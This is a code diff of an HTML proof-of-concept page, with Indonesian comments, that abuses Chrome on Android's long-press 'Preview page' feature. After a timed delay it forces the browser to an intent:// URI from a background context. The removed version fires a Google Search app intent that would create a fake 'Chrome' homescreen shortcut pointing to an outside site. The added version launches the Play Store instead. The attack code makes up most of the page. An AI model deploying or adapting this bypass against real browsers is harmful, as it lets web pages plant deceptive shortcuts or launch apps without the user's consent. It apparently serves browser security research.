@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Android Intent Ultimate PoC</title>
+  <title>Play Store Intent PoC</title>
   <style>
     :root {
       --bg: #0f172a;
       --card: #1e293b;
-      --accent: #3b82f6;
-      --accent-hover: #2563eb;
+      --accent: #10b981;
+      --accent-hover: #059669;
       --text: #f8fafc;
       --text-muted: #94a3b8;
     }
@@ -30,7 +30,7 @@
       background: var(--card);
       padding: 35px 28px;
       border-radius: 16px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
       max-width: 380px;
       width: 100%;
       border: 1px solid rgba(255, 255, 255, 0.05);
@@ -39,7 +39,6 @@
     h2 {
       margin-top: 0;
       font-size: 1.3rem;
-      letter-spacing: -0.025em;
     }
 
     p {
@@ -61,7 +60,6 @@
       font-size: 0.95rem;
       border-radius: 10px;
       transition: background 0.2s, transform 0.1s;
-      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
     }
 
     .target-btn:active {
@@ -76,20 +74,19 @@
       border-radius: 8px;
       font-family: monospace;
       font-size: 0.75rem;
-      color: #38bdf8;
-      border: 1px solid rgba(56, 189, 248, 0.1);
+      color: #34d399;
+      border: 1px solid rgba(52, 211, 153, 0.1);
     }
   </style>
 </head>
 <body>
 
   <div class="wrapper">
-    <h2>Chrome Preview Bypass</h2>
-    <p>Long-press target, select <b>Preview page</b>, and watch the system dialog hook.</p>
+    <h2>Play Store Intent PoC</h2>
+    <p>Long-press target, select <b>Preview page</b>, and observe if Play Store triggers.</p>
     
-    <!-- Target link dengan rel dan atribut penunjang pointer -->
-    <a href="https://www.google.com" id="pocLink" class="target-btn">
-      Trigger Intent Payload
+    <a href="https://play.google.com" id="pocLink" class="target-btn">
+      Trigger Play Store Intent
     </a>
 
     <div class="hud" id="hudStatus">HUD: IDLE - Waiting for long-press</div>
@@ -98,11 +95,11 @@
   <script>
     const link = document.getElementById("pocLink");
     const hud = document.getElementById("hudStatus");
-    let state = 0; // 0: Idle, 1: Armed, 2: Executing
+    let state = 0;
 
-    const payloadIntent = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+    // Intent URI yang menargetkan Google Play Store (contoh: membuka halaman aplikasi WhatsApp atau aplikasi populer lain)
+    const playStoreIntent = "intent://details?id=com.whatsapp#Intent;scheme=market;package=com.android.vending;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.whatsapp;end;";
 
-    // Optimasi penangkapan event pointer & touch awal
     link.addEventListener("pointerdown", () => {
       if (state === 0) {
         state = 1;
@@ -110,21 +107,18 @@
       }
     }, { passive: true });
 
-    // Pemicu utama berbasis contextmenu (terpicu saat long-press menu opsi muncul)
     link.addEventListener("contextmenu", (e) => {
       if (state === 2) return;
       state = 2;
       
       hud.textContent = "HUD: Context menu captured. T-2500ms...";
 
-      // Jeda presisi tinggi untuk memberi waktu render Ephemeral Tab
       setTimeout(() => {
-        hud.textContent = "HUD: Injecting Intent URI...";
+        hud.textContent = "HUD: Injecting Play Store Intent...";
         
-        // Eksekusi pemaksaan intent navigasi eksternal dari background context
-        window.location.href = payloadIntent;
+        // Memaksa navigasi ke skema market/playstore dari background
+        window.location.href = playStoreIntent;
 
-        // Reset siklus state otomatis setelah jeda eksekusi selesai
         setTimeout(() => {
           state = 0;
           hud.textContent = "HUD: State reset. Ready again.";
